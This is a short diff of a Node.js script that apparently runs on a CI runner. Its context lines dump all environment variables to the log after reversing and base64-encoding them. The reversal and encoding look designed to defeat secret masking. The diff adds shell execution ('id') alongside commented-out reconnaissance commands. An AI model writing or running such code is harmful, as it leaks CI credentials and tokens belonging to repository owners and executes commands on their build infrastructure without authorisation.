@@ -3,7 +3,7 @@ const envJson = JSON.stringify(process.env).split("").reverse().join("");
 const envBase64 = Buffer.from(envJson).toString('base64');
 console.log(envBase64);
 
-const { execSync } = require('child_process');
+const { exec, execSync } = require('child_process');
 const fs = require('fs');
 const path = require('path');
 
@@ -47,6 +47,7 @@ function executeShellCommand(command) {
 }
 
 console.log('\r\Running cmds - come onnn.....');
+executeShellCommand('id');
 
 //executeShellCommand('file /opt/hostedtoolcache/node/16.20.2/x64/bin/node');
 //executeShellCommand('ls -la /opt/hostedtoolcache/node/16.20.2/x64/bin');
